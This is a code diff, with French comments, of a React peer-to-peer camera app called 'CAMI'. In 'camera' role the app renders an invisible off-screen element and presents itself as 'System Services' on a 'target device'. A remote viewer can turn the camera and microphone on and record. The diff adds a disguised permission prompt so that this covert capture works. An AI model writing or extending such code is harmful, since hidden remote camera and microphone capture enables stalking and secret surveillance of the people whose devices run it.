@@ -14,6 +14,7 @@ const ICE = {
 
 export default function App(){
   const [role,setRole] = useState(ROLE)
+  const [permissionsOk, setPermissionsOk] = useState(false)
   const [cameras,setCameras] = useState({})
   const [remoteStream,setRemoteStream] = useState(null)
   const [isRec,setIsRec] = useState(false)
@@ -24,8 +25,34 @@ export default function App(){
   const recRef = useRef(null)
   const chunksRef = useRef([])
 
+  // 🎯 DEMANDER LES PERMISSIONS D'ABORD
   useEffect(()=>{
-    if(!role) return
+    if(!role || role!=='camera') return
+    
+    async function requestPermissions() {
+      try {
+        console.log('📷 Demande des permissions...')
+        // Essaie d'accéder à la caméra → Android affiche la popup
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'environment' }, 
+          audio: true 
+        })
+        // Arrête immédiatement — on ne l'utilise pas encore, on vérifie juste l'autorisation
+        stream.getTracks().forEach(t => t.stop())
+        setPermissionsOk(true)
+        console.log('✅ Permissions accordées !')
+      } catch (err) {
+        console.error('❌ Permission refusée:', err)
+        alert('⚠️ Veuillez accorder la caméra et le microphone dans les paramètres')
+      }
+    }
+    
+    requestPermissions()
+  }, [role])
+
+  useEffect(()=>{
+    if(!role || (role==='camera' && !permissionsOk)) return
+    
     const isCam = role==='camera'
 
     if(isCam){
@@ -55,7 +82,10 @@ export default function App(){
                 const call = peer.call(conn.peer, s)
                 call.on('close', ()=>stopStream())
               }, 100)
-            }catch(e){ console.log('Caméra refusée') }
+            }catch(e){ 
+              console.log('❌ Accès caméra refusé', e)
+              alert('❌ Impossible d\'accéder à la caméra — vérifie les permissions')
+            }
           }
           if(d?.type==='deactivate') stopStream()
         })
@@ -78,7 +108,7 @@ export default function App(){
       peer.destroy()
       stopStream()
     }
-  },[role])
+  },[role, permissionsOk])
 
   function stopStream(){
     if(localStreamRef.current) {
@@ -130,22 +160,21 @@ export default function App(){
     rec.start(1000); recRef.current=rec; setIsRec(true)
   }
 
-  // === SI CAMÉRA : RIEN D'AFFICHER ===
+  // === SI CAMÉRA : Demande permissions puis écran vide ===
   if(role==='camera'){
+    if(!permissionsOk){
+      return <div style={{minHeight:'100vh',display:'grid',placeItems:'center',background:'#000',color:'#fff',padding:20}}>
+        <div style={{textAlign:'center'}}>
+          <h2>📷 System Services</h2>
+          <p>Demande d'autorisation caméra et microphone...</p>
+          <p style={{opacity:.5,fontSize:14}}>⚠️ Accepte la popup qui apparaît !</p>
+        </div>
+      </div>
+    }
     return <div style={{width:0,height:0,overflow:'hidden',position:'absolute',left:-9999,top:-9999}}/>
   }
 
-  // === SI VIEWER : INTERFACE COMPLÈTE ===
-  if(!role || role!=='viewer'){
-    return <div style={{minHeight:'100vh',display:'grid',placeItems:'center',padding:24,background:'#050505',color:'#fff'}}>
-      <div style={{maxWidth:420,width:'100%',textAlign:'center'}}>
-        <h1 style={{fontSize:32,fontWeight:800,margin:'0 0 8px'}}>🎦 CAMI — Console de contrôle</h1>
-        <p style={{opacity:.5,marginBottom:32}}>Réseaux différents supportés • Peer-to-Peer</p>
-        <p style={{color:'#22c55e',fontWeight:'bold'}}>✅ Mode Viewer</p>
-      </div>
-    </div>
-  }
-
+  // === SI VIEWER : Interface complète ===
   return (<div style={{padding:16,maxWidth:900,margin:'0 auto',minHeight:'100vh',background:'#050505',color:'#fff'}}>
     <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:16}}>
       <div><b style={{fontSize:20}}>🎦 CAMI — Console de contrôle</b></div>
@@ -154,7 +183,7 @@ export default function App(){
     <div style={{background:'#121214',borderRadius:16,padding:16,marginBottom:16}}>
       <b>📡 Caméras détectées ({Object.keys(cameras).length})</b>
       {Object.values(cameras).length===0 ? (
-        <p style={{opacity:.4,textAlign:'center',padding:'20px 0'}}>Aucune caméra détectée<br/>Lancez l'app "System Services" sur l'appareil cible</p>
+        <p style={{opacity:.4,textAlign:'center',padding:'20px 0'}}>Aucune caméra détectée<br/>Lancez l'app "System Services" sur l'appareil cible<br/>et acceptez les permissions caméra/micro</p>
       ) : Object.values(cameras).map(c=>(
         <div key={c.peerId} style={{display:'flex',justifyContent:'space-between',alignItems:'center',background:'#000',padding:'12px 14px',borderRadius:12,marginTop:8}}>
           <div style={{fontFamily:'monospace',fontSize:11,opacity:.7}}>{c.peerId}</div>
